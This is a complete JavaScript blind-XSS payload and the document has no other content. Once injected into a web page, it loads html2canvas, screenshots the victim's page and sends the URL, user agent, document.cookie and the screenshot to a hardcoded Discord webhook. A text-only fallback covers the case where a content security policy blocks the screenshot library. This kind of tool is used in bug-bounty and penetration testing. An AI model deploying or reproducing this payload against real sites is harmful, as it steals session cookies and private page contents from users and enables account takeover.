(async function() {
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';

    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    try {
        // Dynamically load html2canvas
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        document.head.appendChild(script);

        script.onload = () => {
            html2canvas(document.body).then(canvas => {
                const screenshotBlob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.7));

                const formData = new FormData();
                const embed = {
                    title: "Blind XSS Fired!",
                    description: `**URL:**\n\`\`\`${document.location.href}\`\`\``,
                    color: 16711680, // Red for high alert
                    fields: [
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                        { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\``, inline: false }
                    ],
                    image: { url: "attachment://screenshot.jpg" }
                };
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                formData.append('file', screenshotBlob, 'screenshot.jpg');

                fetch(discordWebhookUrl, { method: 'POST', body: formData })
                    .catch(error => console.error('Webhook Fetch Error:', error));
            });
        };
        script.onerror = () => {
            // If html2canvas fails to load (e.g., blocked by CSP), send a text-only notification
            const embed = {
                title: "Blind XSS Fired (No Screenshot)",
                description: `**URL:**\n\`\`\`${document.location.href}\`\`\`\n\n_html2canvas failed to load, likely due to CSP._`,
                color: 16776960, // Yellow for warning
                fields: [
                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                    { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
                ]
            };
            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        };
    } catch (error) {
        console.error('Payload Error:', error);
    }
})();
